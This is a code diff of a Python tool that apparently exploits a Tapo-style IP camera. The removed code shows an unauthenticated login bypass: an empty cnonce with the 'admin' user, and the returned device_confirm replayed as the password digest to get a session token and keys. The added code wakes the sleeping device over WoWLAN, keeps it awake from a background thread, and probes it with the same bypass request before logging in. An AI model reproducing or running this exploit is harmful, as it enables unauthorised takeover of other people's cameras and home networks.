@@ -63,31 +63,11 @@ def sha(s: str) -> str:
 
 
 def login(host: str, tries: int = 60) -> dict:
-    """Unauthenticated DS bypass: empty cnonce collapses the two digest orders."""
-    for _ in range(tries):
-        try:
-            j = json.loads(post(host, "/", {"method": "login", "params": {
-                "cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=3))
-        except Exception:
-            time.sleep(2)
-            continue
-        d = (j.get("result") or {}).get("data") or {}
-        if not d.get("device_confirm"):
-            time.sleep(2)
-            continue
-        dc, nonce = d["device_confirm"], d["nonce"]
-        try:
-            j2 = json.loads(post(host, "/", {"method": "login", "params": {
-                "cnonce": "", "encrypt_type": "3", "digest_passwd": dc, "username": "admin"}}, timeout=3))
-        except Exception:
-            time.sleep(2)
-            continue
-        if j2.get("error_code") == 0:
-            return {"stok": j2["result"]["stok"], "seq": j2["result"]["start_seq"],
-                    "lsk": sha("lsk" + nonce + dc[:64])[:32],
-                    "ivb": sha("ivb" + nonce + dc[:64])[:32]}
-        time.sleep(2)
-    raise SystemExit("camera never woke")
+    """Delegate to the shared DS client: it speaks both the legacy `device_confirm`
+    flow and the RSA/securePassthrough challenge this firmware switched to. This tool
+    kept its own device_confirm-only copy and therefore never logged in at all."""
+    import tapo_connectap_sc as _sc
+    return _sc.login(host, tries=tries)
 
 
 def main() -> int:
@@ -101,7 +81,46 @@ def main() -> int:
     ap.add_argument("--prefix", default="", help="real Wi-Fi PSK to lead with")
     ap.add_argument("--ssid", default="Aardvark")
     ap.add_argument("--bssid", default="00:00:00:00:00:00")
+    ap.add_argument("--mac", default=None, help="wake with WoWLAN before logging in")
     a = ap.parse_args()
+
+    if a.mac:
+        # the unit re-sleeps within seconds, so the wake has to sit right in front of the
+        # login — a separate "reach" step burns the window it just created
+        import tapo_wake, socket
+        pkt_mac = a.mac
+        for _ in range(90):
+            tapo_wake.send(pkt_mac, a.host, False, 2, 0.2)
+            c = socket.socket(); c.settimeout(0.4)
+            ok = c.connect_ex((a.host, 443)) == 0
+            c.close()
+            if ok:
+                # a connect is not a serving DS: after a crash the socket accepts and
+                # answers nothing (measured), so require a real login reply
+                try:
+                    probe = post(a.host, "/", {"method": "login", "params": {
+                        "cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=2)
+                    ok = bool(probe and probe.strip().startswith("{"))
+                except Exception:
+                    ok = False
+            if ok:
+                print("awake")
+                # keep the radio awake for the whole login+frame: left alone the unit
+                # re-sleeps in seconds and the login lands on a closed port
+                import threading
+                stop = threading.Event()
+
+                def _keep():
+                    while not stop.is_set():
+                        tapo_wake.send(pkt_mac, a.host, False, 1, 0.25)
+                        time.sleep(0.25)
+
+                threading.Thread(target=_keep, daemon=True).start()
+                break
+            time.sleep(0.6)
+        else:
+            print("wake failed")
+            return 1
 
     sess = login(a.host)
     print("stok ok")
